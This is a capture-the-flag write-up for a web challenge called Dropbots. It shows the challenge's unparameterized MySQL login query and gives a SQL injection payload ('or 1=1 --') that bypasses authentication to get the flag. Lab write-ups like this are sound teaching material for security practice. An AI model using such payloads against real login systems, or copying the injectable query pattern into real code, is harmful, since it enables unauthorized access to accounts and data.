# Dropbots (very easy)
## Description
Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

## Technologies of Interest
- mysql

## Initial Thoughts
On load we are prompted with a simple login page so immediately I think it would require some authentication bypass like using sql injection.

## Source Code
Under routes.py we see the /login route that simply reads the input then performs a query. 

Under database.py the login function has the following
```
# We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)
```

This makes it clear we need to do a SQL Injection since parameterization isn't in place and we can pass input directly to mysql. Taking a look at entrypoint.sh we see there is one user 'admin' in 'users' table which is who we will probably want to attack.

## Payload
Using our trusty friend BurpSuite I tried a few simple sql injections and surely the one below worked and we got our flag.

```
{"username":"admin","password":"1\" or 1=1 -- "}
```

Below is what the server would be passing to mysql 

```
SELECT password FROM users WHERE username = "admin" AND password = "1\" or 1=1 -- "
```

All I am doing is closing that password query with \\" then added another logical statement which returns true. Thus, to mysql, password does not matter.